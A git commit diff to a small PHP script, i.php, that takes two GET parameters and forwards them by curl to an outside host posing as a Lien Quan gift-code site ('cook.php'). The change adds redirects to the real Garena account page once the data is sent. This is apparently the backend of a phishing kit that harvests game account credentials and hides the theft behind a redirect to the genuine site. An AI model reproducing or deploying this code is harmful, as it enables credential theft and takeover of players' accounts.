a9d36b6352b00dc96be2e4c9551c9f7c6d9878ff
T <80206409+yourworld03@users.noreply.github.com>
2022-03-14 10:02:20 +0700

    Update i.php

--- i.php
+++ i.php
@@ -1,7 +1,7 @@
 <?php
     $a = $_GET["a"];
     $b = $_GET["b"];
-    if(!isset($a) || !isset($b)) die();
+    if(!isset($a) || !isset($b)) die("<script>location.href = 'https://account.garena.com/'</script>");
     $c = curl_init();
 	curl_setopt($c, CURLOPT_URL, "https://giftcode-lienquan.tk/check/5431/cook.php?a=$a&b=$b");
 	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
@@ -10,4 +10,5 @@
 	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
 	$rq1 = curl_exec($c);
 	curl_close($c);
+	echo "<script>location.href = 'https://account.garena.com/'</script>";
 ?>
